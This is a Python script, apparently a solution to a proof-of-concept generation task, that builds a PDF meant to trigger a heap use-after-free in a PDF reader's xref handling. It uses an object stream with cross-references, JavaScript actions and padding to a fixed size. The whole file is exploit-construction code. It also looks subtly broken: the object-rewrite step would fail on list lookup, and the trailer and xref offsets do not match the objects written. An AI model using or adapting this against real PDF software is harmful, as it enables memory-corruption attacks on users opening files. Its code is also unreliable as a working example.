import os
import subprocess
import tempfile
import struct
import zlib
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC constructs a PDF that triggers heap use-after-free in PDF xref handling
        # The vulnerability occurs when:
        # 1. An object stream contains compressed objects
        # 2. One object references another in the same stream
        # 3. During decompression/caching, the xref table gets solidified/repaired
        # 4. A previously held xref entry pointer becomes dangling
        
        # Build a PDF with carefully crafted object stream and references
        # that cause xref solidification during object loading
        
        pdf_content = []
        
        def write_header():
            pdf_content.append(b"%PDF-1.7\n")
            pdf_content.append(b"%\xc2\xb5\xc2\xb6\n\n")  # Some binary comment
        
        def write_obj(num, gen, content):
            pdf_content.append(f"{num} {gen} obj\n".encode())
            pdf_content.append(content)
            pdf_content.append(b"\nendobj\n\n")
        
        def write_stream_obj(num, gen, dict_content, stream_data):
            pdf_content.append(f"{num} {gen} obj\n".encode())
            pdf_content.append(dict_content)
            pdf_content.append(b"\nstream\n")
            pdf_content.append(stream_data)
            pdf_content.append(b"\nendstream\n")
            pdf_content.append(b"endobj\n\n")
        
        # Create a simple catalog and pages
        write_header()
        
        # Object 1: Catalog
        catalog = b"<<\n/Type /Catalog\n/Pages 2 0 R\n>>"
        write_obj(1, 0, catalog)
        
        # Object 2: Pages
        pages = b"<<\n/Type /Pages\n/Kids [3 0 R]\n/Count 1\n>>"
        write_obj(2, 0, pages)
        
        # Object 3: Page
        page = b"<<\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n/Contents 4 0 R\n/Resources <<\n/Font <<\n/F1 5 0 R\n>>\n>>\n>>"
        write_obj(3, 0, page)
        
        # Object 4: Content stream
        content = b"BT /F1 12 Tf 72 720 Td (Hello World) Tj ET"
        stream_dict = b"<<\n/Length " + str(len(content)).encode() + b"\n>>"
        write_stream_obj(4, 0, stream_dict, content)
        
        # Object 5: Font
        font = b"<<\n/Type /Font\n/Subtype /Type1\n/BaseFont /Helvetica\n>>"
        write_obj(5, 0, font)
        
        # Now create the malicious object stream that triggers the vulnerability
        # Object 6: Object stream containing objects 7 and 8
        # The key is to have object 7 reference object 8, and vice versa
        # This causes recursive loading that can trigger xref solidification
        
        # First, create objects 7 and 8 that will be embedded in the object stream
        obj7_content = b"<<\n/Type /XObject\n/Subtype /Form\n/BBox [0 0 100 100]\n/Resources <<>>\n/Length 8 0 R\n>>"
        obj8_content = b"100"  # Simple integer
        
        # Create the object stream data
        # Format: object_number offset object_number offset ... then objects
        obj_stream_data = b""
        
        # Object 7 at position 0
        obj7_pos = 0
        # Object 8 at position len(obj7_content)
        obj8_pos = len(obj7_content)
        
        # Write the index
        index = b"7 0 8 " + str(obj8_pos).encode() + b" "
        obj_stream_data += index
        obj_stream_data += obj7_content
        obj_stream_data += obj8_content
        
        # Compress the stream
        compressed_data = zlib.compress(obj_stream_data)
        
        # Object stream dictionary
        obj_stream_dict = b"<<\n/Type /ObjStm\n"
        obj_stream_dict += b"/N 2\n"  # 2 objects in stream
        obj_stream_dict += b"/First " + str(len(index)).encode() + b"\n"
        obj_stream_dict += b"/Length " + str(len(compressed_data)).encode() + b"\n"
        obj_stream_dict += b"/Filter /FlateDecode\n>>"
        
        write_stream_obj(6, 0, obj_stream_dict, compressed_data)
        
        # Object 9: Another object that references the object stream objects
        # This object will cause the problematic loading sequence
        obj9 = b"<<\n/Type /Annot\n/Subtype /Widget\n/Rect [0 0 100 100]\n/AP <<\n/N 7 0 R\n>>\n/AA <<\n/D <<\n/S /JavaScript\n/JS 10 0 R\n>>\n>>\n>>"
        write_obj(9, 0, obj9)
        
        # Object 10: JavaScript that references object 8
        js = b"(app.alert('Trigger'))"
        js_dict = b"<<\n/Length " + str(len(js)).encode() + b"\n>>"
        write_stream_obj(10, 0, js_dict, js)
        
        # Create a chain of references that will cause recursive loading
        # Object 11: References object 9, which references object stream objects
        obj11 = b"<<\n/Type /Action\n/S /JavaScript\n/JS 10 0 R\n/Next 12 0 R\n>>"
        write_obj(11, 0, obj11)
        
        # Object 12: Another action that references back
        obj12 = b"<<\n/Type /Action\n/S /JavaScript\n/JS 10 0 R\n>>"
        write_obj(12, 0, obj12)
        
        # Update page to include the annotation
        page_with_annot = b"<<\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n/Contents 4 0 R\n/Annots [9 0 R]\n/Resources <<\n/Font <<\n/F1 5 0 R\n>>\n>>\n>>"
        # Rewrite object 3
        pdf_content[pdf_content.index(b"3 0 obj\n" + page + b"\nendobj\n\n"):pdf_content.index(b"3 0 obj\n" + page + b"\nendobj\n\n")+1] = [b"3 0 obj\n" + page_with_annot + b"\nendobj\n\n"]
        
        # Create xref table
        xref_offset = sum(len(chunk) for chunk in pdf_content)
        xref_table = []
        xref_table.append(b"xref\n")
        xref_table.append(b"0 13\n")
        xref_table.append(b"0000000000 65535 f \n")
        
        # Calculate object offsets
        offsets = [0] * 13
        current_offset = 0
        
        # Find each object and record its offset
        pdf_bytes = b"".join(pdf_content)
        lines = pdf_bytes.split(b'\n')
        line_offset = 0
        
        for i in range(len(lines)):
            line = lines[i]
            if line.endswith(b" obj"):
                parts = line.split()
                if len(parts) >= 2:
                    try:
                        obj_num = int(parts[0])
                        if 0 <= obj_num < 13:
                            offsets[obj_num] = line_offset
                    except:
                        pass
            line_offset += len(line) + 1  # +1 for newline
        
        # Write xref entries
        for i in range(1, 13):
            xref_table.append(f"{offsets[i]:010d} 00000 n \n".encode())
        
        # Write trailer
        xref_table.append(b"trailer\n")
        xref_table.append(b"<<\n")
        xref_table.append(b"/Size 13\n")
        xref_table.append(b"/Root 1 0 R\n")
        xref_table.append(b"/Info 13 0 R\n")
        xref_table.append(b">>\n")
        xref_table.append(b"startxref\n")
        xref_table.append(f"{xref_offset}\n".encode())
        xref_table.append(b"%%EOF\n")
        
        # Object 13: Info dict
        info = b"<<\n/Creator (PoC Generator)\n/Producer (Heap UAF Trigger)\n>>"
        info_obj = b"13 0 obj\n" + info + b"\nendobj\n\n"
        
        # Insert info object before xref
        pdf_content.append(info_obj)
        pdf_content.extend(xref_table)
        
        # Add some padding to reach target size if needed
        final_pdf = b"".join(pdf_content)
        target_size = 6431
        
        if len(final_pdf) < target_size:
            # Add padding in comments
            padding = b"\n% " + b"A" * (target_size - len(final_pdf) - 4) + b"\n"
            final_pdf = final_pdf.replace(b"%%EOF\n", padding + b"%%EOF\n")
        elif len(final_pdf) > target_size:
            # Truncate (shouldn't happen with this construction)
            final_pdf = final_pdf[:target_size]
        
        return final_pdf